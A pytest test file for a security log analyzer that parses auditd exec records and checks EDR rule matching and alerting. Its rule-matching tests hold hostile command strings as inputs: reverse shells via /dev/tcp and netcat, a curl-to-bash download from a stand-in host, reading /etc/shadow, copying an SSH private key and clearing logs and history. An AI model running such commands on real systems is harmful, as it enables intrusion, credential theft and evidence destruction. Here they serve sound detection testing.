from pathlib import Path

from soc_analyzer import analyze_files
from soc_analyzer.detections_edr import detect_edr, match_rules
from soc_analyzer.parsers import parse_lines

SAMPLE = Path(__file__).resolve().parent.parent / "samples" / "auditd_exec.log"
_eid = [5000]


def execve(argv, auid="1001", uid="1001"):
    _eid[0] += 1
    args = " ".join(f'a{i}="{a}"' for i, a in enumerate(argv))
    return [
        f'type=EXECVE msg=audit(1711100000.000:{_eid[0]}): argc={len(argv)} {args}',
        f'type=SYSCALL msg=audit(1711100000.000:{_eid[0]}): success=yes comm="{argv[0]}" '
        f'exe="/bin/{argv[0]}" key="k" auid={auid} uid={uid}',
    ]


# ── Parsing ──────────────────────────────────────────────────────

def test_execve_reconstructs_command():
    [e] = parse_lines(execve(["cat", "/etc/shadow"]))
    assert e.source == "host" and e.action == "exec"
    assert e.detail["command"] == "cat /etc/shadow"
    assert e.detail["exe"] == "/bin/cat"


def test_hex_encoded_args_decoded():
    # auditd hex-encodes args with spaces: "bash -c id;whoami"
    lines = ['type=EXECVE msg=audit(1711100000.000:9001): argc=3 a0="bash" a1="-c" a2=69643B77686F616D69',
             'type=SYSCALL msg=audit(1711100000.000:9001): success=yes comm="bash" exe="/bin/bash" auid=1001 uid=1001']
    [e] = parse_lines(lines)
    assert e.detail["command"] == "bash -c id;whoami"


def test_multiline_event_stitched_by_id():
    lines = execve(["whoami"])
    assert len(parse_lines(lines)) == 1       # EXECVE + SYSCALL = one event, not two


def test_auditd_mixes_with_syslog():
    lines = execve(["id"]) + ["Mar 20 10:00:00 ubuntu sshd[1]: Failed password for root from 10.0.0.1 port 22 ssh2"]
    sources = {e.source for e in parse_lines(lines, year=2026)}
    assert sources == {"host", "ssh"}


# ── Rule matching ────────────────────────────────────────────────

def test_rules_match_expected():
    assert "reverse_shell" in match_rules("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert "reverse_shell" in match_rules("nc -e /bin/sh 10.0.0.1 4444")
    assert "download_and_run" in match_rules("curl http://evil.invalid/a.sh | bash")
    assert "credential_access_files" in match_rules("cat /etc/shadow")
    assert "private_keys" in match_rules("cp /home/x/.ssh/id_rsa /tmp/k")
    assert "clear_logs" in match_rules("truncate -s 0 /var/log/auth.log")
    assert "clear_history" in match_rules("history -c")


def test_benign_commands_do_not_match():
    for cmd in ["ls -la /var/www", "apt update", "systemctl status nginx",
                "cat /etc/hostname", "grep error /var/log/app.log"]:
        assert match_rules(cmd) == [], cmd


def test_grep_on_logs_is_not_log_clearing():
    assert "clear_logs" not in match_rules("grep sshd /var/log/auth.log")


# ── Detection ────────────────────────────────────────────────────

def test_reverse_shell_is_critical():
    [alert] = detect_edr(parse_lines(execve(["bash", "-i"])))
    assert alert["severity"] == "CRITICAL"
    assert alert["type"] == "EDR_REVERSE_SHELL"
    assert alert["mitre"]["technique_id"] == "T1059.004"


def test_alerts_grouped_per_user_and_rule():
    lines = execve(["cat", "/etc/shadow"], auid="1001") + execve(["cat", "/etc/shadow"], auid="1002")
    alerts = detect_edr(parse_lines(lines))
    assert len({a["ip"] for a in alerts}) == 2        # one per user


# ── Sample end to end ────────────────────────────────────────────

def test_edr_sample_end_to_end():
    report = analyze_files([SAMPLE])
    inc = report["incidents"]
    assert len(inc) == 1 and inc[0]["ip"] == "auid=1001" and inc[0]["breach"]
    tactics = set(inc[0]["tactics"])
    assert {"Execution", "Credential Access", "Persistence", "Defense Evasion"} <= tactics
    assert report["summary"]["breaches"] == 1
    # benign admin (auid=1000) raised nothing
    assert "auid=1000" not in {a["ip"] for a in report["alerts"]}
